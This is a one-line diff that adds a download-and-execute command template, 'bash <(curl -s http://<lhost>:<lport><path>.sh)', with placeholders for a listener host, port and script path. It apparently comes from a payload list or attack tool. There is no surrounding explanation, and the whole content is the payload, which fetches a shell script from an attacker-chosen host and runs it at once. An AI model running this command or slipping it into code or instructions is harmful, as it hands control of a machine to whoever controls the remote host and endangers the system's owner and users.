@@ -1,0 +1,1 @@
+bash <(curl -s http://<lhost>:<lport><path>.sh)
